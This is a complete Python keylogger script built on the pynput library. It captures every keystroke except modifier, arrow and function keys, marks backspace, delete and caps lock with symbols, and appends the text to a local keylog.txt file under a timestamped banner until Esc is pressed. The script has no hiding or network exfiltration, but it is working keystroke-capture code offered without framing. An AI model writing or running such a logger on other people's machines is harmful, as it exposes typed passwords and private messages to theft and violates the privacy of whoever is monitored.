# Import libraries for time and computer input
import datetime
import pynput
from pynput.keyboard import Key, Listener


# Varaible definition for output String and directional key boolean
keys = ""
arrows = False

# Lists to classify types of special keys
shiftKeys = [Key.shift, Key.shift_l, Key.shift_r]
directionalKeys = [Key.up, Key.down, Key.left, Key.right]
functionKeys = [Key.f1, Key.f2, Key.f3, Key.f4, Key.f5, Key.f6, Key.f7, Key.f8, Key.f9, Key.f10, Key.f11, Key.f12, Key.f13, Key.f14, Key.f15, Key.f16, Key.f17, Key.f18, Key.f19, Key.f20]
computerKeys = [Key.alt, Key.alt_gr, Key.alt_l, Key.alt_r, Key.ctrl, Key.ctrl_l, Key.ctrl_r, Key.cmd, Key.cmd_l, Key.cmd_r, Key.esc, Key.insert]

# List to unite all skippable keys
unimportantKeys = shiftKeys + directionalKeys + functionKeys + computerKeys

# Function that determines which key was pressed, and if/what to write to the file
def press(key):
    global keys
    global arrows
    newKey = str(key).replace("'", "")
    if (key in unimportantKeys):
        if (key in directionalKeys):
            arrows = True
        else:
            pass
    elif (key == Key.enter or key == Key.tab):
        new_line()
    elif (key == Key.space):
        keys += " "
        write_line(keys)
    elif (key == Key.backspace):
        keys += "[<]"
        write_line(keys)
    elif (key == Key.delete):
        keys += "[>]"
        write_line(keys)
    elif (key == Key.caps_lock):
        keys += "[^]"
        write_line(keys)
    else:
        keys += newKey
        write_line(keys)
    keys = ""

# Function that terminates the program, and outputs a warning message if directional keys were used
def release(key):
    if (key == Key.esc):
        if (arrows == True):
            new_line()
            write_line(["[[[[[ WARNING: Directional Keys used. ]]]]]"])
        return False

# Function that writes the characters of the output String to the file
def write_line(keys):
    with open("keylog.txt", "a") as file:
        for key in keys:
            file.write(key)

# Function that creates a new line in the file
def new_line():
    with open("keylog.txt", "a") as file:
        file.write("\n\n")

# Function that creates a timestamped banner in the file for each execution
def banner():
    with open("keylog.txt", "a") as file:
        file.write("\n\n")
        file.write("==================================================")
        file.write("\n\n")
        file.write("Logging keystrokes at {}".format(datetime.datetime.now().replace(microsecond = 0)))
        file.write("\n\n")
        file.write("==================================================")
        file.write("\n\n")

# Call to the banner function
banner()

# Continuous loop that runs the program until it's terminated
with Listener(on_press = press, on_release = release) as listener:
    listener.join()